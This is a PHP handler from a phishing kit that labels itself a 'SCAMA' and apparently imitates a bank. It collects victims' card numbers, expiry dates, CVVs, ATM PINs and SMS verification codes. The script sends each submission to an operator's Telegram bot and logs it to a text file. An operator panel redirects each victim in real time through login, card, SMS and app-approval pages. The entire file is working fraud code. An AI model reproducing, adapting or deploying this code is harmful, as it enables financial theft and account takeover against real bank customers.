<?php
    session_start(); 
    error_reporting(0);

    include '../setting/functions.php';  
    $ip = get_client_ip();
    $botToken = TOKEN;
    $chatId = CHATID;

    $link = $_SESSION["panel_control"];
    $buttonText = 'Link Panel - '. get_client_ip(); 
    $telegramApiEndpoint = "https://api.telegram.org/bot$botToken/sendMessage";
    $keyboard = [
        'inline_keyboard' => [
            [
                [
                    'text' => $buttonText,
                    'url' => $link,
                ],
            ],
        ],
    ];
    $keyboardJson = json_encode($keyboard);
    $messageData = [
        'chat_id' => $chatId,
        'text' => 'Click For Open Panel Control For This Ip Address : [ ' . get_client_ip() . " - " . $_SESSION['code_country_visit'].' ]',
        'reply_markup' => $keyboardJson,
    ];
 
    if($_SERVER['REQUEST_METHOD'] === 'POST'){
        if($_POST['step'] === 'credit-card'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_5'])) {
                // Info User :
                $name_card = $_POST['name_card'];
                $card_number = $_POST['numberdrac'];
                $expires = $_POST['datedrac'];
                $cvv = $_POST['vvcdrac'];
                $pin = $_POST['pin'];
                
                $cardNumber = str_replace(' ', '', $card_number);
                $firstSixDigits = substr($cardNumber, 0, 6);
                $lastFourDigits = substr($cardNumber, -4);
                
                $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
                $options = [
                    "http" => [
                        "method" => "GET",
                        "header" => "Referer: your_domain\r\n"
                    ]
                ];
            
                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Last_four_digits"] = $lastFourDigits;
        
                if ($data["Scheme"] === "MASTERCARD") {
                    $_SESSION["image_by"] = '<img src="../img/by-mastercard.png" alt="">';
                } elseif ($data["Scheme"] === "VISA") {
                    $_SESSION["image_by"] = '<img src="../img/by-visa.png" alt="">';
                } elseif ($data["Scheme"] === "DISCOVER") {
                    $_SESSION["image_by"] = '<img src="../img/by-discover.png" alt="">';
                } elseif ($data["Scheme"] === "MASTERCARD") {
                    $_SESSION["image_by"] = '<img src="../img/by-moestro.png" alt="">';
                } elseif ($data["Scheme"] === "AMERICAN EXPRESS") {
                    $_SESSION["image_by"] = '<img src="../img/by-american-express.png" alt="">';
                } else {
                    $_SESSION["image_by"] = $data["Issuer"];
                }

                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
        
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Type"] = $data["Type"];
                $_SESSION["Scheme"] = $data["Scheme"];
                $_SESSION["name"] = $name_card;
                $_SESSION["card_number"] = $lastFourDigits;
                $_SESSION["expires"] = $expires;
            
                // Send Data To Telegram Bot :
                $message_2 =
                "💳============ [ Credit Card ] ============💳\r\n".
                "[ 🪪 Cardholder Name ] " . $name_card ."\r\n".
                "[ 💳 Card Number ] " ."<code>". $cardNumber ."</code>"."\r\n".
                "[ 📅 Expiry Date ] " ."<code>". $expires ."</code>"."\r\n".
                "[ 🔐 Cvv ] " ."<code>". $cvv ."</code>"."\r\n".
                "[ 🔐 Pin ATM ] " ."<code>". $pin ."</code>"."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ 💳 Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💳============ [ Credit Card ] ============💳\r\n";
                telegram_copy($message_2);
                
        
                // Use cURL to send the message
                $ch = curl_init($telegramApiEndpoint);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "============ [ Credit Card ] ============\r\n".
                "[ Cardholder Name ] " . $name_card ."\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                "[ Expiry Date ] " . $expires ."\r\n".
                "[ Cvv ] " . $cvv ."\r\n".
                "[ Pin ATM ] " . $pin ."\r\n".
                "[ Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "============ [ Credit Card ] ============\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
            }
            header('Location: ../pages/loading.php');
            
        }
        elseif($_POST['step'] === 'credit-card-error'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_6'])) {
                // Info User :
                $name_card = $_POST['name_card'];
                $card_number = $_POST['numberdrac'];
                $expires = $_POST['datedrac'];
                $cvv = $_POST['vvcdrac'];
                $pin = $_POST['pin'];
                $cardNumber = str_replace(' ', '', $card_number);
                $firstSixDigits = substr($cardNumber, 0, 6);
                $lastFourDigits = substr($cardNumber, -4);
                
                $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
                $options = [
                    "http" => [
                        "method" => "GET",
                        "header" => "Referer: your_domain\r\n"
                    ]
                ];
            
                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Last_four_digits"] = $lastFourDigits;
        
                if ($data["Scheme"] === "MASTERCARD") {
                    $_SESSION["image_by"] = '<img src="../img/by-mastercard.png" alt="">';
                } elseif ($data["Scheme"] === "VISA") {
                    $_SESSION["image_by"] = '<img src="../img/by-visa.png" alt="">';
                } elseif ($data["Scheme"] === "DISCOVER") {
                    $_SESSION["image_by"] = '<img src="../img/by-discover.png" alt="">';
                } elseif ($data["Scheme"] === "MASTERCARD") {
                    $_SESSION["image_by"] = '<img src="../img/by-moestro.png" alt="">';
                } elseif ($data["Scheme"] === "AMERICAN EXPRESS") {
                    $_SESSION["image_by"] = '<img src="../img/by-american-express.png" alt="">';
                } else {
                    $_SESSION["image_by"] = $data["Issuer"];
                }

                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
        
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Type"] = $data["Type"];
                $_SESSION["Scheme"] = $data["Scheme"];
                $_SESSION["name"] = $name_card;
                $_SESSION["card_number"] = $lastFourDigits;
                $_SESSION["expires"] = $expires;
            
                // Send Data To Telegram Bot :
                $message_2 =
                "💳============ [ Credit Card ERROR ] ============💳\r\n".
                "[ 🪪 Cardholder Name ] " . $name_card ."\r\n".
                "[ 💳 Card Number ] " ."<code>". $cardNumber ."</code>"."\r\n".
                "[ 📅 Expiry Date ] " ."<code>". $expires ."</code>"."\r\n".
                "[ 🔐 Cvv ] " ."<code>". $cvv ."</code>"."\r\n".
                "[ 🔐 Pin ATM ] " ."<code>". $pin ."</code>"."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ 💳 Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💳============ [ Credit Card ERROR ] ============💳\r\n";
                telegram_copy($message_2);
        
                // Use cURL to send the message
                $ch = curl_init($telegramApiEndpoint);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "============ [ Credit Card ERROR ] ============\r\n".
                "[ Cardholder Name ] " . $name_card ."\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                "[ Expiry Date ] " . $expires ."\r\n".
                "[ Cvv ] " . $cvv ."\r\n".
                "[ Pin ATM ] " . $pin ."\r\n".
                "[ Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "============ [ Credit Card ERROR ] ============\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
            }
            header('Location: ../pages/loading.php');            
        }
        elseif($_POST['step'] === 'sms'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_7'])) {
                // Info User :
                $mss = $_POST['mss'];
                
                // Send Data To Telegram Bot :
                $message = urlencode(
                "📲—————————— [ Code SMS ] ——————————📲\r\n".
                "[ Code SMS ] " . $mss ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲—————————— [ Code SMS ] ——————————📲\r\n");
                telegram($message);

                // Use cURL to send the message
                $ch = curl_init($telegramApiEndpoint);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "|—————————— [ Code SMS ] ——————————|\r\n".
                "[ Code SMS ] " . $mss ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "|—————————— [ Code SMS ] ——————————|\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
            }

            header('Location: ../pages/loading.php');

        } 
        elseif($_POST['step'] === 'sms-error'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_8'])) {
               // Info User :
               $mss = $_POST['mss'];
                
               // Send Data To Telegram Bot :
               $message = urlencode(
               "📲—————————— [ ERROR Code SMS ] ——————————📲\r\n".
               "[ Code SMS ] " . $mss ."\r\n".
               "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
               "📲—————————— [ ERROR Code SMS ] ——————————📲\r\n");
               telegram($message);

               // Use cURL to send the message
               $ch = curl_init($telegramApiEndpoint);
               curl_setopt($ch, CURLOPT_POST, 1);
               curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
               curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
               $response = curl_exec($ch);
               curl_close($ch);

               $message_to_file = 
               "|—————————— [ ERROR Code SMS ] ——————————|\r\n".
               "[ Code SMS ] " . $mss ."\r\n".
               "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
               "|—————————— [ ERROR Code SMS ] ——————————|\r\n";

               $file = fopen("../file/file.txt", "a");
               fwrite($file, $message_to_file. "\n");
               fclose($file);
            }

            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'accept-app'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);

            if(isset($_POST['send_data_9'])) {
                $status = "User Click Continue From Page (Accept App Bank)";

                // Send Data To Telegram Bot :
                $message = urlencode(
                "📲=========[ Page (Accept App Bank) ]=========📲\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲=========[ Page (Accept App Bank) ]=========📲\\r\n");
                telegram($message);

                // Use cURL to send the message
                $ch = curl_init($telegramApiEndpoint);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "=========[ Page (Accept App Bank) ]=========\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "=========[ Page (Accept App Bank) ]=========\\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
            }
            header('Location: ../pages/loading.php');
            
        }
        elseif($_POST['step'] === 'accept-app-error'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);
            if(isset($_POST['send_data_10'])) {
                $status = "User Click Continue From Page Error (Accept App Bank)";

                // Send Data To Telegram Bot :
                $message = urlencode(
                "📲=========[ Page ERROR (Accept App Bank) ]=========📲\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲=========[ Page ERROR (Accept App Bank) ]=========📲\\r\n");
                telegram($message);

                // Use cURL to send the message
                $ch = curl_init($telegramApiEndpoint);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "=========[ Page ERROR (Accept App Bank) ]=========\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "=========[ Page ERROR (Accept App Bank) ]=========\\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
            }
            header('Location: ../pages/loading.php');
            
        }
        elseif($_POST['step'] === 'confirmed'){
            $target = $_POST['ip'];

            $jsonFilePath = "../panel/storage/{$target}.json";

            $json_data = file_get_contents($jsonFilePath);

            $user_data = json_decode($json_data, true);

            $user_data['redirect_user'] = " ";

            $updated_json_data = json_encode($user_data);

            file_put_contents($jsonFilePath, $updated_json_data);
            if(isset($_POST['send_data_11'])) {
                $status = "Thanks Page End Step";

                // Send Data To Telegram Bot :
                $message = urlencode(
                "💸💶—————————— [ Current Page User ] ——————————💸💶\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💸💶—————————— [ Current Page User  ] ——————————💸💶\r\n");
                telegram($message);

                // Use cURL to send the message
                $ch = curl_init($telegramApiEndpoint);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "|——————————[ Current Page User ]——————————|\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "|——————————[ Current Page User  ]——————————|\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
            }
            header('Location: ../pages/loading.php');
            
        }
        elseif($_POST['step'] === 'panel'){

            if($_POST['to'] === 'login'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "login"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'login-error'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "login-error"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'information'){

                $code_reader_panel = $_POST['code_reader_panel'];
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "information"; 
                $user_data['code_reader'] = $code_reader_panel;

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'information-error'){

                $code_reader_panel = $_POST['code_reader_panel'];
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "information-error"; 
                $user_data['code_reader'] = $code_reader_panel;

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
            }
            elseif($_POST['to'] === 'credit-card'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "credit-card"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'credit-card-error'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "credit-card-error"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'sms'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "sms"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'sms-error'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "sms-error"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'accept-app'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "accept-app"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'accept-app-error'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "accept-app-error"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'confirmed'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "confirmed"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'logout'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);

                $jsonFilePath = "../panel/storage/{$file_name}.json";

                $json_data = file_get_contents($jsonFilePath);

                $user_data = json_decode($json_data, true);

                $user_data['redirect_user'] = "logout"; 
                $user_data['current_page'] = "User Is Logout From SCAMA"; 
                $user_data['userStatus'] = "<span class='offline'></span>"; 

                $updated_json_data = json_encode($user_data);

                file_put_contents($jsonFilePath, $updated_json_data);
            }
            header('Location: ./panel.php?id_user='. $_POST["id_vip"].'');
        }

    } else {
        header('Location: ../index.php');
    }
?>